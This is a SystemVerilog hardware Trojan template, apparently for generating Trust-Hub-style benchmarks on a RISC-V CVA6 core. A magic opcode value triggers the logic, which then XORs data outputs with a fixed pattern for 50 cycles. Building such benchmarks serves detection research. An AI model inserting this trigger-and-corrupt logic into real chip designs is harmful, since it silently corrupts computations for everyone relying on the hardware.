/**
 * Hardware Trojan Template: Data Integrity Violation
 * 
 * Category: Sequential Logic
 * Pattern Type: Data Integrity / Computation Corruption
 * 
 * Source: Trust-Hub Benchmark AES-T800
 * Reference: https://trust-hub.org/benchmarks/AES-T800
 * 
 * Description:
 *   Corrupts computation results by XORing with error pattern or
 *   bit-flipping specific data bits during critical operations.
 *
 * RISC-V Adaptation:
 *   Targets computation units in RISC-V:
 *   - ALU results
 *   - Load/Store data
 *   - Register file writes
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 */

module cva6_rvfi_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    input  logic [{{WIDTH}}-1:0] fu_op,
    input  logic [{{WIDTH}}-1:0] {{DATA_INPUT}},
    output logic [{{WIDTH}}-1:0] {{DATA_OUTPUT}}
);

    localparam logic [{{WIDTH}}-1:0] CORRUPTION_PATTERN = {{WIDTH}}'hA5A5A5A5;
    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'h12345678;
    
    logic trojan_corrupt;
    logic [7:0] corruption_counter;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_corrupt <= 1'b0;
            corruption_counter <= '0;
        end else begin
            if (fu_op == TRIGGER_PATTERN) begin
                trojan_corrupt <= 1'b1;
                corruption_counter <= 8'd50;
            end
            
            if (corruption_counter > 0) begin
                corruption_counter <= corruption_counter - 1;
            end else begin
                trojan_corrupt <= 1'b0;
            end
        end
    end
    
    assign {{DATA_OUTPUT}} = trojan_corrupt ? 
                             ({{DATA_INPUT}} ^ CORRUPTION_PATTERN) : 
                             {{DATA_INPUT}};

endmodule